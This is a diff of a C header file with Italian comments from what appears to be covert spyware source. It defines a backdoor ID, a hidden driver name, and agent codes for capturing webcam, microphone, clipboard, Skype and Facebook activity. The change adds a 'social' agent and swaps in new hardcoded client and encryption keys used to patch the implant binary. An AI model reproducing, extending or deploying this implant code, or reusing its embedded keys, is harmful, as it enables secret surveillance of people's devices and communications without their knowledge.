@@ -52,17 +52,11 @@ extern char H4DRIVER_NAME[];
 extern char REGISTRY_KEY_NAME[];
 extern char EXE_INSTALLER_NAME[];
 
-// Delimitatori delle sezioni nel file di configurazione
-// Devono essere NULL terminated anche nel file
-#define EVENT_CONF_DELIMITER "EVENTCONFS-"
-#define AGENT_CONF_DELIMITER "AGENTCONFS-"
-#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
-#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
-#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"
+extern BOOL is_demo_version;
 
 #define COMMON_CODEC_NAME "codec"
 #define COMMON_UPDATE_NAME "core"
-#define COMMON_UPDATE64_NAME "dll64"
+#define COMMON_UPDATE64_NAME "core64"
 #define COMMON_RAPI_NAME "rapi"
 #define COMMON_SQLITE_NAME "sqlite"
 #define COMMON_MOBILE_CORE_NAME "wmcore.001"
@@ -74,6 +68,10 @@ extern char EXE_INSTALLER_NAME[];
 #define DRIVER_NAME "ndisk.sys" 
 #define DRIVER_NAME_W L"ndisk.sys"
 
+// Per controllare il processo Host "social"
+#define SOCIAL_PROCESS_CONTINUE 0
+#define SOCIAL_PROCESS_PAUSE 1
+#define SOCIAL_PROCESS_EXIT 2
 
 // Nome della tag che nei comandi e nei download indica la home
 #define HOME_VAR_NAME "$dir$" 
@@ -93,10 +91,25 @@ extern char EXE_INSTALLER_NAME[];
 #define SHARE_MEMORY_ASP_DATA_BASENAME "KMS4"
 
 // Versione del client 
-#define CLIENT_VERSION "2012013101"
+#define CLIENT_VERSION "2012041601"
 
+// -------- Elementi per il binary patching ---------
 // Chiave UNIVOCA fra server e client
-#define CLIENT_KEY "A02H90JL00000000"
+//#define CLIENT_KEY "A02H90JL00000000"
+#define CLIENT_KEY "f7Hk0f5usd04apdvqw13F5ed25soV5eD"
+
+//#define ENCRYPTION_KEY "ngkdNGKDh4H4883"
+#define ENCRYPTION_KEY "3j9WmmDgBqyU270FTid3719g64bP4s52"
+
+//#define ENCRYPTION_KEY_CONF "ngkdNGKDh4H4869"
+#define ENCRYPTION_KEY_CONF "Adf5V57gQtyi90wUhpb8Neg56756j87R"
+
+//#define BACKDOOR_ID "RCS_0000000744"
+#define BACKDOOR_ID "av3pVck1gb4eR2"
+
+#define DEMO_TAG "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+
+//----------------------------------------------------
 
 #define WRAPPER_MAX_SHARED_MEM 0x40 // Dimensione di un blocco di shared mem dedicato
                                     // alla configurazione di wrapper e agenti.
@@ -113,16 +126,19 @@ extern char EXE_INSTALLER_NAME[];
 #define PM_PRINTAGENT (WR_HIDE_CON + WRAPPER_MAX_SHARED_MEM)   // 0x0100
 #define PM_VOIPRECORDAGENT (PM_PRINTAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0140
 #define PM_URLLOG (PM_VOIPRECORDAGENT + WRAPPER_MAX_SHARED_MEM)     // 0x0180
-#define PM_SNAPSHOTAGENT_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
+#define PM_ONNEWWINDOW_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
 #define PM_CONTACTSAGENT      0x0200
 #define PM_DEVICEINFO         0x0240
 #define PM_MOUSEAGENT         0x0280
 #define PM_CRISISAGENT        0x02C0
 #define PM_IMAGENT_SKYPE      0x0300
-
+#define PM_IMAGENT_SOCIAL	  0x0301	// Usato per i log di tipo IM che vengono dall'agente social
 
 #define PM_URLAGENT_SNAP (PM_URLLOG + 1) // Usato per gli snapshot degli url (non e' un agente ma solo un logtype)
 #define PM_FILEAGENT_CAPTURE 0x00000001  // (non e' un agente ma solo un logtype)
+
+#define PM_SOCIALAGENT		  0xAAB0
+#define PM_SOCIALAGENT_FB	  0xAAB1	// Usato per i file di markup per il modulo facebook dell'agente social
 #define PM_AMBMICAGENT        0xC2C2
 #define PM_WEBCAMAGENT        0xE9E9
 #define PM_CLIPBOARDAGENT     0xD9D9
@@ -137,6 +153,5 @@ extern char EXE_INSTALLER_NAME[];
 #define PM_SNAPSHOTAGENT      0xB9B9 // Ha un valore alto per averlo fra gli ultimi
                                 // visto che non dovra' avere una zona di memoria per IPC
                                 // (altrimenti occuperei memoria inutilmente)
-
 
 
